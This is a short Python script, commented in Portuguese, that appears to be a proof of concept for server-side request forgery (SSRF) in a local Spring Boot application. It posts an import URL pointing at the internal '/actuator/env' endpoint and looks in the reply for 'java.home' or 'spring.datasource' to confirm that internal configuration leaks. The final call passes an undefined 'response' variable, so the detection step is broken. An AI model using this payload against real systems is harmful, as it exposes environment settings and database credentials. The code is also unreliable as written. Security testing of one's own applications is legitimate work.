import requests

# Passo 1: Criar dicionário JSON
def criar_dicionario_json():
    return {
        'url_importacao': 'http://localhost:8080/actuator/env'
    }

# Passo 2: Enviar POST para a API
def enviar_post_json(json):
    try:
        response = requests.post('http://localhost:8080/api/documents/importar', json=json)
        response.raise_for_status()  
        print("Resposta do endpoint:", response.text) 
    except requests.exceptions.RequestException as e:
        print(f"Erro ao enviar POST request: {e}")

# Passo 3: Verificar resposta HTTP
def verificar_resposta(response):
    if "java.home" in response.text or "spring.datasource" in response.text:
        print("Vulnerabilidade SSRF Crítica: A API está a refletir recursos internos da infraestrutura")  

# Executar as funções em sequência
json_data = criar_dicionario_json()
enviar_post_json(json_data)

verificar_resposta(response) 